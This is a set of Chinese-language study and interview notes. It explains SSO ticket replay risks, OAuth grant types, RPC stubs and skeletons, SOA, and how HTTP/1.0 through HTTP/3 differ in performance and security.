<p>重放攻击指的是：攻击者截获一段合法通信（如登录票据 ticket），在不修改的情况下重复发送，从而冒充合法用户完成认证。</p>
</blockquote>
<h2 id="✅-如果-SSO-的-ticket-被重放，会造成什么后果？">✅ 如果 SSO 的 ticket 被重放，会造成什么后果？</h2>
<h3 id="❗-典型后果：“攻击者冒充用户登录业务系统”">❗ 典型后果：<strong>“攻击者冒充用户登录业务系统”</strong></h3>
<h3 id="📌-举例说明：">📌 举例说明：</h3>
<h3 id="🎬-场景描述：">🎬 场景描述：</h3>
<ol>
<li>用户小明访问 <code>a.com/pageA</code>，未登录，被重定向到 <code>sso.com</code> 登录；</li>
<li>小明在登录页面输入账号密码，登录成功；</li>
<li>SSO 生成一个 ticket，比如 <code>T123456</code>，重定向回 <code>a.com/pageA?ticket=T123456</code>；</li>
<li><strong>攻击者此时截获了这段 URL（通过网络监听、DNS劫持、浏览器插件漏洞等方式）</strong>。</li>
</ol>
<h3 id="🎭-攻击过程：">🎭 攻击过程：</h3>
<ol>
<li>攻击者拿着这个 ticket <code>T123456</code>，<strong>立刻访问</strong> <strong><code>a.com/pageA?ticket=T123456</code></strong>；</li>
<li>如果系统没有做票据校验（或允许 ticket 多次使用），服务器会以为攻击者是小明本人；</li>
<li>系统为攻击者创建 session，直接登录进了小明的账户！</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTE5ZWQzMTQxYzRjMTc4NmIzZjBlN2EwMWE2NTU1NTlfQkU1RmFJQVFtWE1zSFVjZ2Jlc2c2VUpqUm1BNzRHamRfVG9rZW46TmFRRmJjaENQb3dnZWN4cFpaR2MwcFpybjdlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<blockquote>
<p>那如果攻击者是第一个使用该ticket的不就绕过了我们的预防了吗</p>
</blockquote>
<h2 id="✅-我们来详细解析这个问题：">✅ 我们来详细解析这个问题：</h2>
<h3 id="📌-假设场景：">📌 假设场景：</h3>
<ol>
<li>用户小明成功登录了 SSO，获取了票据 <code>ticket=T123456</code>；</li>
<li>攻击者通过某种手段（比如浏览器插件、Wi-Fi 中间人、DNS 劫持）<strong>抢在小明之前拿到了这个 ticket</strong>；</li>
<li>攻击者立刻携带 ticket 访问 <code>a.com/pageA?ticket=T123456</code>；</li>
<li><strong>系统校验通过，认为这是小明本人，并给攻击者创建了合法 session</strong>；</li>
<li>等小明再用 ticket 登录时，发现 ticket 已失效（因为是一次性的）——<strong>他自己却被“踢”了</strong>！</li>
</ol>
<h2 id="😱-严重性分析：">😱 严重性分析：</h2>
<ul>
<li>攻击者“冒名顶替”了合法用户；</li>
<li>系统误认为攻击者是合法登录用户；</li>
<li><strong>防重放机制本身反而“帮了攻击者”</strong>，让真正的用户失效。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDczMzU0NzI2OWJhNWEyZmZjNjE1YWE4ODE5YjNmOTBfNjhyanl2WlNYYlhWTGNMajdZTG5tNnZkTnVlMm1kOGVfVG9rZW46TzZ5emJSNzRyb0V3WmJ4bWg4SGNjbDZjbm1kXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>OAuth的三种认证方式</h1>
<h3 id="🌟-1-授权码模式（Authorization-Code-Grant）">🌟 1. 授权码模式（Authorization Code Grant）</h3>
<blockquote>
<p>✅ <strong>最常用、最安全</strong>，适用于<strong>Web 应用（后端服务器）</strong></p>
</blockquote>
<h4 id="🌐-流程：">🌐 流程：</h4>
<ol>
<li>用户访问客户端（如前端页面）。</li>
<li>客户端跳转到授权服务器，请求授权码（用户登录并同意授权）。</li>
<li>授权服务器重定向回客户端，并携带授权码（code）。</li>
<li>客户端使用授权码向授权服务器换取 access token。</li>
<li>客户端用 token 访问资源服务器。</li>
</ol>
<h4 id="🛡️-优点：">🛡️ 优点：</h4>
<ul>
<li>客户端通过后端交换 token，不暴露 access token。</li>
<li>可结合 <strong>PKCE</strong> 提升安全性（尤其在移动端）。</li>
</ul>
<h3 id="🌟-2-简化模式（Implicit-Grant）🚫（已废弃-不推荐）">🌟 2. 简化模式（Implicit Grant）🚫（已废弃/不推荐）</h3>
<blockquote>
<p>⚠️ 曾用于<strong>单页应用（SPA）或纯前端应用</strong>，<strong>OAuth 2.1 已废弃该模式</strong></p>
</blockquote>
<h4 id="🌐-流程：-2">🌐 流程：</h4>
<ol>
<li>用户登录授权服务器，直接返回 <code>access_token</code> 给前端。</li>
<li>前端直接使用该 token 调用资源 API。</li>
</ol>
<h4 id="❌-缺点：-2">❌ 缺点：</h4>
<ul>
<li>token 暴露在 URL 中，<strong>安全性差</strong>。</li>
<li>无法安全刷新 token。</li>
</ul>
<h3 id="🌟-3-密码模式（Resource-Owner-Password-Credentials-Grant）">🌟 3. 密码模式（Resource Owner Password Credentials Grant）</h3>
<blockquote>
<p>⚠️ 用于<strong>完全信任的客户端</strong>（如自家 App），<strong>不推荐对外开放使用</strong></p>
</blockquote>
<h4 id="🌐-流程：-3">🌐 流程：</h4>
<ol>
<li>用户直接把用户名+密码输入到客户端。</li>
<li>客户端用这些凭证向授权服务器获取 token。</li>
<li>用 token 访问资源服务器。</li>
</ol>
<h4 id="❌-缺点：-3">❌ 缺点：</h4>
<ul>
<li>客户端能获取用户密码，<strong>风险大</strong>。</li>
<li>不符合 OAuth 将“资源所有者”和“客户端”解耦的初衷。</li>
</ul>
<h1>stub、skeleton（RPC）</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGYyYTEwMmNiYmVkMjU2NDI4MTUxNmZmODVlYzU1NDhfMVRmTUpoWExRQXNVZzNWckJUVGpzTGRLRG9TdEwzT2ZfVG9rZW46VmI0V2JUNDY0b1Q1eld4TmFRVWN5SWpybkFoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🎯-举个例子：你打电话叫外卖">🎯 举个例子：你打电话叫外卖</h2>
<blockquote>
<p>假设你用手机 App 点外卖：</p>
</blockquote>
<h3 id="✅-你这边是客户端：">✅ 你这边是客户端：</h3>
<ul>
<li>你点了按钮 <code>下单(&quot;汉堡&quot;)</code></li>
<li>实际 Stub 做了这些事：
<ul>
<li>把“汉堡”封装成字节流（序列化）</li>
<li>通过网络（socket、HTTP）发给远程服务器</li>
</ul>
</li>
</ul>
<p>👉 <strong>这就是 Stub 的工作</strong></p>
<h3 id="✅-服务端接到请求：">✅ 服务端接到请求：</h3>
<ul>
<li>Skeleton 接收到字节流</li>
<li>它解包、识别方法名和参数（反序列化）</li>
<li>然后调用服务端真实的方法 <code>下单(&quot;汉堡&quot;)</code></li>
<li>结果再序列化返回给客户端</li>
</ul>
<p>👉 <strong>这就是 Skeleton 的工作</strong></p>
<h1>从SOA到微服务</h1>
<p>SOA，全称 <strong>Service-Oriented Architecture（面向服务的架构）</strong>，是一种<strong>系统架构风格</strong>，核心思想是：</p>
<blockquote>
<p>把系统中的功能封装成一组 <strong>服务（Service）</strong>，通过统一的协议进行通信，从而实现系统的<strong>解耦、复用、灵活组合</strong>。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzllMjA2YzRmZGY2NzQ4YzlhMjQxNTAzZWQ1ZDYwZGZfTHF4YzJuR0RJU3dLOVo4NHY1UzhlOXp6Q3VUdGFPcldfVG9rZW46V1E0Q2JtQXlGb3VFRmR4emNQcGN5RmhXbmFjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjQ1ZmZlYzgxOWQzNjllN2U3ZGQ4ZThhOGY3NDk5YzZfbUxhYmtnZ1FiZzNCZmRoazJCeWtFQzd1Zlh4ODdJdGpfVG9rZW46QW56VWJCVFFMb0lvbEJ4bDR0S2NaV0dybkhjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NThmOTMxYWNmMjE2YzMyOTkxMTNjYWVmOTljOWQ5MjVfbmtxNERNZjA5VjdZS2pUbVNIR2owd1poYlhvcmI0VnNfVG9rZW46UGpuaGJDdXVxb3VXS0d4bmFSQWNQbzMzbkJmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OGEwNmY3YjRmNmJmMTRhNTUxZmY1ZmVkZGIzMjU5ZGZfVlNpNEFTaDlCaUhJb2pHZ200TzU3M1JuRmVZM2JGbHJfVG9rZW46UWhaTmJrVlRWb2d4TDh4eENUNWNGRzMxbmlwXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>HTTP/1.0、1.1、2.0、3.0和HTTP Server 1.0、2.0、3.0的区别</h1>
<h2 id="📘-一、HTTP-1-0-——-原始协议">📘 一、HTTP/1.0 —— 原始协议</h2>
<h3 id="✅-核心特点：">✅ 核心特点：</h3>
<ul>
<li>每次请求建立一次 TCP 连接，请求完成即断开</li>
<li>不支持连接复用</li>
<li>头部不压缩</li>
<li>无状态、明文传输（默认）</li>
</ul>
<h3 id="❌-存在问题：">❌ 存在问题：</h3>
<ul>
<li>每张网页包含很多资源（JS、CSS、图片）时，需要多次 TCP 连接，<strong>性能低</strong></li>
<li>请求/响应头部较大，<strong>传输效率差</strong></li>
<li>没有并发能力，请求是<strong>串行的</strong></li>
</ul>
<h3 id="📌-举例：">📌 举例：</h3>
<p>浏览器请求一个网页，加载 HTML、CSS、JS、图片共 10 个资源，会建立并关闭 10 次 TCP 连接，效率非常低。</p>
<h2 id="📗-二、HTTP-1-1-——-主流协议">📗 二、HTTP/1.1 —— 主流协议</h2>
<h3 id="✅-核心改进：">✅ 核心改进：</h3>
<ul>
<li><strong>持久连接（keep-alive）</strong>：多个请求复用一个 TCP 连接</li>
<li><strong>管线化（pipelining）</strong>：可以并发发送多个请求（但响应仍串行返回）</li>
<li>引入 <strong>Host 头部</strong>，支持虚拟主机（多个网站共用一个 IP）</li>
</ul>
<h3 id="❌-问题仍在：">❌ 问题仍在：</h3>
<ul>
<li><strong>队头阻塞（Head-of-line blocking）</strong>：多个请求共用连接，但响应还是串行返回，前一个响应未返回，后面都会被阻塞。</li>
<li>TCP 本身的限制，丢包导致整个连接阻塞。</li>
</ul>
<h3 id="📌-举例：-2">📌 举例：</h3>
<p>请求 10 个资源，只需建立 <strong>1 个 TCP 连接</strong>，但如果第 1 个响应很慢，后面 9 个都要等它，造成队头阻塞。</p>
<h2 id="📕-三、HTTP-2-0-——-多路复用时代">📕 三、HTTP/2.0 —— 多路复用时代</h2>
<h3 id="✅-核心改进：-2">✅ 核心改进：</h3>
<ul>
<li><strong>二进制分帧（frame）</strong>：所有请求和响应都被切成小的二进制帧传输，结构清晰、可并行</li>
<li><strong>多路复用（Multiplexing）</strong>：一个连接中可并发多个请求和响应，不再串行</li>
<li><strong>头部压缩（HPACK）</strong>：压缩重复的请求头</li>
<li><strong>服务端推送（Server Push）</strong>：服务器可以主动发送资源到客户端缓存中</li>
</ul>
<h3 id="🎯-优点总结：">🎯 优点总结：</h3>
<ul>
<li>避免队头阻塞（从“请求级”升级为“帧级别”）</li>
<li>更少连接开销，节省资源</li>
<li>更快的加载速度，提升用户体验</li>
</ul>
<h3 id="📌-举例：-3">📌 举例：</h3>
<p>浏览器访问页面，1 个连接并发发送多个请求、多个响应并发返回，不相互干扰，加载速度大幅提升。</p>
<h2 id="📙-四、HTTP-3-0-——-基于-QUIC-协议">📙 四、HTTP/3.0 —— 基于 QUIC 协议</h2>
<blockquote>
<p>HTTP/3 最大的不同：<strong>抛弃了 TCP，改用 QUIC（基于 UDP）协议</strong></p>
</blockquote>
<h3 id="✅-核心创新：">✅ 核心创新：</h3>
<ul>
<li><strong>基于 UDP 的 QUIC 协议</strong>，实现可靠传输</li>
<li>内建 <strong>TLS 1.3 加密</strong>，提高安全性</li>
<li>完全解决<strong>TCP 丢包导致的连接级阻塞</strong></li>
<li>更快的连接建立（0-RTT）</li>
</ul>
<h3 id="🎯-优点总结：-2">🎯 优点总结：</h3>
<ul>
<li><strong>真正的无队头阻塞</strong></li>
<li>连接更快（减少握手开销）</li>
<li>丢包对其他请求<strong>完全无影响</strong></li>
<li>更适合移动端、弱网环境</li>
</ul>
<h3 id="📌-举例：-4">📌 举例：</h3>
<p>手机在地铁中访问页面，如果 TCP 丢包，会严重影响 HTTP/1.1 和 HTTP/2，但 HTTP/3 可以快速恢复单个数据流的传输，体验明显更流畅。</p>
<h2 id="📊-总结对比表格：">📊 总结对比表格：</h2>
<h2 id="✅-面试-答题总结模板：">✅ 面试/答题总结模板：</h2>
<blockquote>
<p>HTTP/1.0 使用短连接，性能差；HTTP/1.1 引入长连接和管线化但仍有队头阻塞；HTTP/2 通过二进制分帧和多路复用显著提升性能，但仍基于 TCP；HTTP/3 底层换为基于 UDP 的 QUIC 协议，彻底解决队头阻塞，连接更快更稳，特别适合移动端和高延迟网络环境。</p>
</blockquote>
<h2 id="🍽️-场景设定：你去餐厅点菜">🍽️ 场景设定：你去餐厅点菜</h2>
<p>你（浏览器）是顾客，餐厅服务员（HTTP 协议）负责传递菜单和菜品，后厨（服务器）做菜。</p>
<h3 id="✅-HTTP-1-0：一个菜一趟，点一次走一次">✅ HTTP/1.0：<strong>一个菜一趟，点一次走一次</strong></h3>
<p>你点一个菜，服务员去厨房跑一趟，拿回菜后结束本次服务。</p>
<p>你再点第二个菜，又得再叫他一次，他再去厨房，再回来……依此类推。</p>
<p>🔻<strong>问题：</strong></p>
<ul>
<li>每道菜都要服务员来回一趟，太慢了。</li>
<li>吃个饭频繁打断，效率低，资源浪费。</li>
</ul>
<p>📝 关键词：<strong>短连接、每个请求一条连接</strong></p>
<h3 id="✅-HTTP-1-1：点多个菜，一次送完（支持长连接）">✅ HTTP/1.1：<strong>点多个菜，一次送完（支持长连接）</strong></h3>
<p>你把所有要点的菜一次性告诉服务员，他记好后去厨房跑一趟，然后<strong>依次把每个菜拿回来</strong>。</p>
<p>🔺好处：</p>
<ul>
<li>减少来回次数（长连接）</li>
</ul>
<p>🔻问题：</p>
<ul>
<li>如果第一道菜慢，服务员就卡在那，<strong>后面的菜全被堵住</strong>（队头阻塞）</li>
</ul>
<p>📝 关键词：<strong>长连接、管线化、但响应串行</strong></p>
<h3 id="✅-HTTP-2：服务员会多线程上菜（多路复用）">✅ HTTP/2：<strong>服务员会多线程上菜（多路复用）</strong></h3>
<p>你点好一堆菜后，服务员可以同时去厨房叫不同厨师准备菜，然后<strong>同时端着多个盘子过来一起上桌</strong>。</p>
<ul>
<li>厨房每道菜都并发处理，服务员并发送菜</li>
<li>哪道菜先做好，先上，不用等待排队</li>
</ul>
<p>🔺优势：</p>
<ul>
<li>多菜同时送</li>
<li>不受前一道菜慢的影响</li>
<li>服务员只用一条路线就能送很多菜（连接复用）</li>
</ul>
<p>📝 关键词：<strong>多路复用、头部压缩、服务器推送</strong></p>
<h3 id="✅-HTTP-3：点餐、传菜都用外卖员（UDP-QUIC）-还支持断点续传">✅ HTTP/3：<strong>点餐、传菜都用外卖员（UDP + QUIC）+ 还支持断点续传</strong></h3>
<p>服务员不再走传统餐厅通道，而是改用<strong>外卖小哥</strong>送餐（QUIC 协议，基于 UDP）：</p>
<ul>
<li>如果小哥路上打滑（丢包），不会影响其他菜送达（没有连接级别阻塞）</li>
<li>外卖路径更短，送餐更快（0-RTT）</li>
<li>可以边走边传，不怕中断（弱网也稳）</li>
</ul>
<p>🔺适合：</p>
<ul>
<li>手机点餐、地铁信号弱、频繁切换网络的场景</li>
</ul>
<p>📝 关键词：<strong>基于 UDP、QUIC、0-RTT、无队头阻塞、移动端友好</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTVjNzY0ZThlMTU5YzlkNWFlMjg0MDA3NGQ1MDM5ZmJfZzNVZFVPQTVibkk2eVhWd1ZkWTdmeGJCcXk4M2JPcGdfVG9rZW46WVlsamIyNzhIb2o1eDR4UEtJamM2enJRbjljXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="💬-面试答题模板（可背诵）：">💬 面试答题模板（可背诵）：</h2>
<blockquote>
<p>HTTP/1.1 相比 HTTP/1.0 有多个关键改进：</p>
<ol>
<li>默认支持长连接；</li>
<li>支持 Host 头，可托管多个虚拟主机；</li>
<li>引入缓存控制字段（如 Cache-Control、ETag）；</li>
<li>支持分块传输（Transfer-Encoding: chunked）；</li>
<li>支持更多状态码和请求方法；</li>
<li>支持断点续传（Range 请求）；</li>
</ol>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NWUxY2JlNzc0YWVhNzUzZTEwM2MzMTI5MzM3MGIzZmJfYUNLQkFqaml0M0lYck94OG1rQ2V2aUZYQ0NmR1pud0lfVG9rZW46U00xMGJQSXdIb3A2ekZ4RXRkaGM0Y0thbjdlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="💬-面试答题模板">💬 面试答题模板</h3>
<blockquote>
<p>在 HTTP/1.0 中，客户端发起请求时会直接将请求头和请求体一起发送，没有 <code>Expect: 100-continue</code> 机制，也没有 100 状态码。这意味着服务器即使在接收到请求头后决定拒绝请求，客户端仍然会发送完整的请求体，导致网络和服务器资源浪费。而 HTTP/1.1 引入了 <code>100 Continue</code> 状态码，允许客户端在发送大请求体之前询问服务器是否愿意接受，优化了大数据请求的处理流程。</p>
</blockquote>
<h2 id="✅-在-HTTP-1-1-中实际的含义是：">✅ 在 HTTP/1.1 中实际的含义是：</h2>
<ul>
<li><strong>你（浏览器）把多个请求一次性发出（比如图片1、图片2、JS、CSS 等）</strong></li>
<li>服务员（HTTP 连接）通过同一个长连接接受多个请求（<strong>管线化请求 pipeline</strong>）</li>
<li>但服务员<strong>必须</strong>：
<ul>
<li>去厨房（服务器）逐个取菜（处理请求）</li>
<li>必须<strong>按顺序返回</strong>（即使后面的菜先做好了也不能先上）</li>
</ul>
</li>
</ul>
<h2 id="🔁-也就是说：">🔁 也就是说：</h2>
<ul>
<li>浏览器和服务器之间只建了一次 TCP 连接（不像 HTTP/1.0 每个请求都重新建立连接）</li>
<li>但是这些请求<strong>依旧是串行响应的</strong>（即便请求是“并行”发的）</li>
</ul>
<h2 id="✅-举例（更技术点）：">✅ 举例（更技术点）：</h2>
<p>假设浏览器发出三个请求：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GET</span> /a.jpg ``<span class="built_in">GET</span> /b.css ``<span class="built_in">GET</span> /c.js</span><br></pre></td></tr></table></figure>
<ul>
<li>HTTP/1.1 可以在一个连接上连续发送这三个请求</li>
<li>但服务器必须<strong>按顺序处理响应</strong>，即：
<ul>
<li>等 <code>/a.jpg</code> 处理完并返回后</li>
<li>才能发送 <code>/b.css</code></li>
<li>然后才是 <code>/c.js</code></li>
</ul>
</li>
</ul>
<p>🔻这就会出现一个问题：</p>
<ul>
<li>如果第一个响应慢（a.jpg 特别大），后面的两个就被**“堵”<strong>住了，这就是</strong>队头阻塞（Head-of-line blocking）**</li>
</ul>
<h2 id="✅-所以你问的“是否一次性把所有要的数据都取出”：">✅ 所以你问的“是否一次性把所有要的数据都取出”：</h2>
<blockquote>
<p>❌ 不是“服务员一次性端上所有菜” ✅ 而是“服务员记下所有菜名，厨房一份一份做，服务员一次一份地端回来，<strong>不能跳过顺序</strong>”</p>
</blockquote>
<table>
<thead>
<tr>
<th>概念分类</th>
<th>名称</th>
<th>核心作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>HTTP 协议版本</td>
<td>HTTP/1.0~3.0</td>
<td>定义客户端与服务器通信格式</td>
</tr>
<tr>
<td>服务器架构阶段</td>
<td>Server 1.0~4.0</td>
<td>优化服务端处理请求的方式</td>
</tr>
<tr>
<td>系统层技术</td>
<td>select / epoll</td>
<td>提升服务器 I/O 效率</td>
</tr>
</tbody>
</table>
<p><code>HTTP/1.0</code>、<code>HTTP/1.1</code>、<code>HTTP/2.0</code>、<code>HTTP/3.0</code> 是 <strong>HTTP 协议的版本演进</strong>，和 <code>HTTP Server 1.0 / 2.0 / 3.0</code>（服务器架构演进）<strong>是两个完全不同的概念</strong>，只是名字容易让人混淆。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjE4MjVmMmQzZjExYTUyOTBmYzA2ZWExZjI2MzBiOWRfTzJHOFNNM01ZWUpOV0NFS3EyazQ2dHI5Z3A0OHBtNFVfVG9rZW46TWZBUWJOa3c3b05LR2l4QTB4Q2N1QTBKbjI2XzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NmM1MTliMTY5ZDdkY2NkZDAzMmJjZTQ3MDVmZWFlN2VfWG1WQmQ5UlkwbHk3UFdrYUNhS0dSbkkzMVE5eVFETzFfVG9rZW46UVZUMmI4ekpsb1dOekh4Q1RyNmNKUHBvbnNmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<blockquote>
<p>所以http/2.0协议不阻塞是因为使用了http server3.0以上的select或epoll解决的吗？答案：不是</p>
</blockquote>
<blockquote>
<p>❌ <strong>HTTP/2.0 协议实现“非阻塞”和“多路复用”，并不是因为用了 select 或 epoll，而是协议本身设计了多路复用的机制</strong>； ✅ 但 <strong>select/epoll 等 I/O 模型</strong> 是<strong>服务器底层支持高并发的实现基础</strong>，两者<strong>配合使用</strong>可以实现真正的“高效 + 非阻塞”。</p>
</blockquote>
<h2 id="🧠-举个现实的例子帮助你理解">🧠 举个现实的例子帮助你理解</h2>
<p>假设你是一个快递公司老板，你有两种“工作能力”和两种“派送路线”：</p>
<ul>
<li><strong>工作能力（协议）</strong>：
<ul>
<li>HTTP/1.1：每送一个包裹就重新排队（串行）</li>
<li>HTTP/2.0：你能同时送多个包裹（多路复用）</li>
</ul>
</li>
<li><strong>派送路线（I/O 模型）</strong>：
<ul>
<li>阻塞 I/O：每条路只能一个人走，其他人等着</li>
<li>epoll（非阻塞）：你派人去监听每条路，哪条通了就立刻发人，<strong>不会空等</strong></li>
</ul>
</li>
</ul>
<h3 id="所以：">所以：</h3>
<ul>
<li>HTTP/2.0 + epoll = 又能同时送多包裹，又能高效分发，不浪费路！</li>
<li>HTTP/2.0 + 阻塞 I/O = 能多送，但路上卡顿严重，效率不高</li>
<li>HTTP/1.1 + epoll = 分发快，但一次只能送一个，仍然浪费潜力</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NTNiN2QwY2Q3M2M3N2E5MDM4NDljYzQ2M2NhMDM0NjJfNUJDWWVOWmNQbTNqVmp3WmRvWkZ5anBrcnBVNUFNcE9fVG9rZW46SERPQWJyNmpibzdvZDJ4eXJ1SGNQMG5wbllmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YmI2N2M1MDIwZDkzOGIyZmM4NGRhZTU2ZjM4NDY1MjhfNzRUallXdllVOVU5SjNydmRpSENZbm1vS2FqT0NDVzRfVG9rZW46T2lXZWJnQ0lkb1p3akt4N0YzUGNKVnNUbjVmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="HTTP-2-0-虽然解决了“应用层队头阻塞”，但仍然存在“TCP-层队头阻塞”问题">HTTP/2.0 虽然解决了“应用层队头阻塞”，但仍然存在“TCP 层队头阻塞”问题</h2>
<p>HTTP/2.0 多请求复用一个 TCP 连接，一旦发生丢包，就会阻塞住所有的 HTTP 请求</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YmRjODE1ZmI1OGJkZjQzOTE1ZDVlZmJhMjlkYzY0YzFfYmR4U0Z6c1Rma0RZWmZrS1hyUThxemNVU29EN25HbDNfVG9rZW46UWJDUWJhaGJFb25nSVh4VUpTQ2NjTEVUbkFkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTdmMDMxYjczYTZiNmNjZmRmMTNhZmEzMTUzYzVjMTlfbTdQd0tUZGx1ZlRnQTc4WjFmNmkwMnhwdnZlTVVBS2lfVG9rZW46V3pWZmJkNHQ5b0dWMUp4TTN0WWNNTGM5blBjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjZlMzMyNDIzYWMyOTE0YzFmYjIxNjhiMmRlMzEwMGNfTkdBM1VUQzZGUVJHS1F3WGhqanpicGJQVXdKbTlnZnRfVG9rZW46VUhwUWJ3eHJCb2NVUk94bTVEbWNSWDRlbmdmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="http-2-0和http-3-0安全性对比">http/2.0和http/3.0安全性对比</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzE2MWYxOWM2MjIwOWI3YThiZDYyOTAzMmE0NmZhYWVfREdWakhuV3c1dFBlWWdaV2ZIV0NtcWc4UlFHVzBmbmZfVG9rZW46QkhkN2Jjc0NUb0w2NnN4U1ZvQmNjajczbnBnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><strong>安全性</strong>：在 HTTP/2.0 中，TLS 用于加密和认证整个 HTTP 会话，包括所有的 HTTP 头部和数据负载。TLS 的工作是在 TCP 层之上，它加密的是在 TCP 连接中传输的应用层的数据，并不会对 TCP 头部以及 TLS 记录层头部进行加密，所以在传输的过程中 TCP 头部可能会被攻击者篡改来干扰通信。而 HTTP/3.0 的 QUIC 对整个数据包（包括报文头和报文体）进行了加密与认证处理，保障安全性。</p>
<h2 id="🔍-详细解释">🔍 详细解释</h2>
<h3 id="🔹-HTTP-2-0-的加密（基于-TLS）">🔹 HTTP/2.0 的加密（基于 TLS）</h3>
<ul>
<li>TLS 是工作在 <strong>TCP 上的协议</strong>，用来加密应用层（即 HTTP 数据）。</li>
<li>但它 <strong>无法加密 TCP 头部</strong>，因为 TCP 是操作系统内核控制的。</li>
<li>所以攻击者虽然无法看到你访问的内容（因为内容被 TLS 加密）， 但可以看到你：</li>
</ul>
<blockquote>
<ul>
<li>在和谁通信（目的 IP/端口）、通信速率、发送了多少数据（大小）、什么时候发了数据（时间间隔）</li>
</ul>
</blockquote>
<ul>
<li>最坏情况：<strong>攻击者可根据这些信息干扰 TCP 连接</strong>（如丢包攻击、重排包等）。</li>
</ul>
<h3 id="🔹-HTTP-3-0-的加密（基于-QUIC）">🔹 HTTP/3.0 的加密（基于 QUIC）</h3>
<ul>
<li>QUIC 是基于 UDP 构建的，<strong>不走 TCP</strong>，所有数据都由用户层协议控制。</li>
